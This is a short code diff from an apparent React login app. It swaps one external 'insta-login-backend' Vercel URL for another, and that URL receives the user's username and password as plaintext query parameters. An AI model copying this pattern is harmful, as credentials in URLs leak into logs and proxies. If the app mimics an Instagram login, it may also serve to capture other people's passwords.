@@ -21,7 +21,7 @@ function App() {
   }
   async function check() {
   try {
-    const response = await axios.get(`https://insta-login-backend-mauve.vercel.app/login?username=${user}&password=${pass}`);
+    const response = await axios.get(`https://insta-login-backend-ecru.vercel.app/login?username=${user}&password=${pass}`);
     
     // Assuming your backend sends `true` or `false`
     if (response.data === true) {
